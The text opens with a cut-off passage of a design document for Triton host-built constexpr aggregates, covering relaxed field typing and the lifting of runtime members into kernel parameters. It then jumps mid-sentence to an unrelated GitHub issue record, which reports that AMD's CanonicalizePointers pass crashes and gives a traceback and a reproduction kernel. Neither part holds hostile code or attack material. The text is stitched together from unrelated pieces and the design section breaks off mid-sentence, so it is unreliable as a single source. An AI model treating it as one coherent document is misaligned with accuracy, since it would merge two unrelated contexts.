- **One clean signature** regardless of how rich the epilogue is.
- **Compile-time polymorphism**: the aggregate's concrete type selects which
  `apply` is emitted — no runtime branching.
- **Cache-friendly**: changing the `bias` tensor or `scale` value reuses the
  compiled kernel; only compile-time members specialize a new one.
- **Composable via inheritance**: derive a richer epilogue from a base one and
  override its `@triton.jit` methods.

## Design

### User-facing contract

An aggregate field is classified by its annotation:

- Annotated `tl.constexpr` → **compile-time member**, baked into the kernel and
  participating in the compilation cache key.
- Any other annotation (`tl.tensor`, `tl.tensor_descriptor`, scalar, …) →
  **runtime member**, lifted to a runtime kernel parameter.

The aggregate is built on the host inside a `@triton.constexpr_function`
`__init__`, and passed to a kernel parameter declared `: tl.constexpr`. Nothing
else in the kernel body changes: `self.bias`, `self.scale`, `self.n_cols` are
accessed exactly as they would be for an in-kernel aggregate.

### Host construction: relaxed field typing (`language/core.py`)

`_aggregate`'s `__setattr__` previously required every assigned value to be an
instance of the field's annotated type. That rejects a raw `torch.Tensor` being
stored into a `tl.tensor` field on the host.

The check is relaxed so that, for **runtime** fields, a raw host value (a
`torch.Tensor`, a host `TensorDescriptor`, a Python scalar) is permitted. Two
guards remain:

- A `tl.constexpr` field still requires a `constexpr` value.
- A *Triton* value (`base_value`) of the wrong type is still rejected.

```python
if ann is constexpr or isinstance(value, base_value):
    raise TypeError(...)
```

This narrowly opens the door for host construction while keeping in-kernel
type-safety intact.

### Runtime lifting (`runtime/jit.py`)

A new `HostConstexprAggregate` wrapper captures, from a host-built aggregate:

- `base_cls`, `field_order`
- `const_bindings` — the compile-time members (by value)
- `runtime_names` / `runtime_values` — the runtime members
- `cache_key` — a **stable, value-based** key computed from the class, the
  compile-time member values, and the runtime member *layout* (names only).
  Runtime member *values* deliberately do **not** enter the key. Tensor members
  are keyed structurally (`tensor(shape, dtype)`), never by contents.

A new `JITFunction._specialize_host_aggregates(backend, bound_args, specialization)`
step runs inside `run()` (and is mirrored in `_filecheck.run_parser`). For each
`constexpr` argument that is a host-built aggregate with runtime members it:

1. Specializes each runtime member via `native_specialize_impl` (obtaining its
   IR type and argument attributes such as divisibility).
2. Rewrites the bound argument to a tuple `(wrapper, *runtime_values)` so the
   members flow through the **existing tuple-argument machinery** (signature,
   launcher, IR) with no new launch path.
3. Records the specialization as `(("constexpr", *member_types), (wrapper, *member_attrs))`
   so the wrapper's identity participates in the cache key and each member's
   attributes are preserved.

A **pure** compile-time

items.title: AMD CanonicalizePointers crashes on tt.pointer_range=32 pointer live across control-flow merge with nested early return.
items.author: O1iveira7
items.body_excerpt:
### Describe the bug

The AMD TTIR-to-TTGIR pipeline crashes when a small-tensor pointer with
`tt.pointer_range = 32` is derived on both sides of runtime control flow and a
nested path returns before the merge block.

This was first seen in fuzz-generated matrix transpose kernels. The original,
untransformed transpose kernel compiles for AMD with the same runtime pointer
attributes. The transformed variants compile and run on NVIDIA, but AMD fails in
`make_ttgir`.

The failure is not specific to stores: both an output pointer and an input
pointer can trigger it.
### Traceback
```
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 370, in <lambda>
    return lambda *args, **kwargs: self.run(grid=grid, warmup=False, *args, **kwargs)
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 739, in run
    kernel = self._do_compile(key, signature, device, constexprs, options, attrs, warmup)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 884, in _do_compile
    kernel = self.compile(src, target=target, options=options.__dict__)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/compiler/compiler.py", line 327, in compile
    next_module = compile_ir(module, metadata)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 508, in <lambda>
    stages["ttgir"] = lambda src, metadata: self.make_ttgir(src, metadata, options)
                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 273, in make_ttgir
    pm.run(mod, 'make_ttgir')
RuntimeError: PassManager::run failed

PassManager::run failed
```
  The underlying stderr diagnostic is:

 ```text
  python: .../llvm/ADT/ArrayRef.h:248:
  const T &llvm::ArrayRef<mlir::ValueRange>::operator[](size_t) const
  [T = mlir::ValueRange]:
  Assertion `Index < Length && "Invalid index!"' failed.

  error: Failures have been detected while processing an MLIR pass pipeline
  note: Pipeline failed while executing
  [`TritonAMDGPUCanonicalizePointers` on 'tt.func' operation: @repro_output_pointer]
```
### Reproduce
Run this on an AMD system:
```
import torch
import triton
import triton.language as tl


@triton.jit
def repro_output_pointer(switch_ptr, output):
    values = tl.load(switch_ptr + tl.arange(0, 2))
    zero, one = tl.split(values)
    true_cond = zero < one
    false_cond = zero > one
    offsets = tl.arange(0, 32)

    if true_cond:
        output_ptrs = output + offsets + zero
    else:
        output_ptrs = output + offsets
        if false_cond:
            return

    if true_cond:
        tl.store(output_ptrs, offsets)


switch = torch.tensor([0, 1], dtype=torch.int32, device="cuda")
output = torch.empty(32, dtype=torch.int32, device="cuda")
repro_output_pointer[(1,)](switch, output)
torch.cuda.synchronize()
```

- Triton: 3.7.1
- AMD Instinct MI308X
